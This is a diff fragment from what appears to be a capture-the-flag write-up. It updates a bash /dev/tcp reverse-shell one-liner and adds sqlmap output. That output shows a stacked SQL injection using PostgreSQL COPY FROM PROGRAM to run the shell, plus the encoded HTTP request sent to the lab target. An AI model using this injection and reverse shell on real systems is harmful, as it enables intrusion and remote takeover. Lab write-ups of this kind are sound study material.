@@ -417,7 +417,21 @@ Attacker:
 
 Victim:
 
-    bash -c 'bash -i >& /dev/tcp/10.10.15.25/6969 0>&1'
+    bash -c 'bash -i >& /dev/tcp/10.10.14.196/6969 0>&1'
+
+Victim gets sent this:
+
+    os-shell>     bash -c 'bash -i >& /dev/tcp/10.10.14.196/6969 0>&1'
+    [21:46:51] [PAYLOAD] test';DROP TABLE IF EXISTS sqlmapoutput;CREATE TABLE sqlmapoutput(data text);COPY sqlmapoutput FROM PROGRAM '    bash -c ''bash -i >& /dev/tcp/10.10.14.196/6969 0>&1''';--
+    [21:46:51] [TRAFFIC OUT] HTTP request [#29]:
+    GET /dashboard.php?search=test%27%3BDROP%20TABLE%20IF%20EXISTS%20sqlmapoutput%3BCREATE%20TABLE%20sqlmapoutput%28data%20text%29%3BCOPY%20sqlmapoutput%20FROM%20PROGRAM%20%27%20%20%20%20bash%20-c%20%27%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.196%2F6969%200%3E%261%27%27%27%3B-- HTTP/1.1
+    Cache-control: no-cache
+    Cookie: PHPSESSID=51ai5vlm0bsmiragl1lnv2t3qg
+    User-agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.2) Gecko/2008092000 Ubuntu/8.04 (hardy) Firefox/3.0.2
+    Host: 10.10.10.46
+    Accept: */*
+    Accept-encoding: gzip,deflate
+    Connection: close
 
 Upgrade:
 
